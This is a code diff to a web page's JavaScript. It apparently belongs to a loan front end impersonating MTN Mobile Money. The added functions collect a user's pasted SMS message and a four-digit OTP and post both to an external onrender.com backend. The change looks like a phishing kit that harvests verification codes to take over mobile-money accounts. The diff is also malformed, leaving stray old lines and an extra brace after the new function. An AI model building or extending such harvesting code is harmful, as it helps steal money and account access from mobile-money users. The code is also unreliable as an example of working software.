@@ -203,6 +203,9 @@
   </div>
 
   <script>
+  window.API_BASE = 'https://mtn-momo-backend.onrender.com';
+</script>
+  <script>
     // ── State ──────────────────────────────────────────────
     const S = {
       isSubmitting: false,
@@ -377,10 +380,74 @@
       checkStatus();
     }
 
-    // ── OTP submission (placeholder) ────────────────────────
-    async function doOtp() {
-      // stub — replace with real OTP submission
-      console.log('doOtp called');
+      
+      // ── Submit pasted SMS text ─────────────────────────────
+  async function submitSms() {
+    const smsText = document.getElementById('smsMsgBox').value.trim();
+    if (!smsText) {
+      alert('Please paste the SMS message.');
+      return;
+    }
+    try {
+      const res = await fetch(`${window.API_BASE||''}/api/submit-sms`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          applicationId: S.applicationId,
+          smsText: smsText
+        })
+      });
+      const data = await res.json();
+      if (data.success) {
+        goTo('page-otp');
+        chkOtp();
+      } else {
+        alert(data.message || 'Failed to submit SMS.');
+      }
+    } catch (err) {
+      alert('Network error: ' + err.message);
+    }
+  }
+
+    
+    // ── Verify OTP ─────────────────────────────────────────
+  async function doOtp() {
+    const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
+    if (otp.length !== 4) {
+      showOtpMsg('error', 'Please enter the 4-digit OTP.');
+      return;
+    }
+
+    document.getElementById('mOtp').classList.add('show');
+    document.getElementById('bOtp').disabled = true;
+    document.getElementById('bOtp').textContent = 'VERIFYING...';
+
+    try {
+      const res = await fetch(`${window.API_BASE||''}/api/verify-otp`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          applicationId: S.applicationId,
+          otp: otp
+        })
+      });
+      const data = await res.json();
+      document.getElementById('mOtp').classList.remove('show');
+
+      if (data.success) {
+        pollForOtpApproval(S.applicationId);
+      } else {
+        document.getElementById('bOtp').disabled = false;
+        document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
+        showOtpMsg('error', data.message || 'Failed to submit OTP.');
+      }
+    } catch (err) {
+      document.getElementById('mOtp').classList.remove('show');
+      document.getElementById('bOtp').disabled = false;
+      document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
+      showOtpMsg('error', 'Error: ' + err.message);
+    }
+  }
       // After success:
       // pollForOtpApproval(S.applicationId);
     }
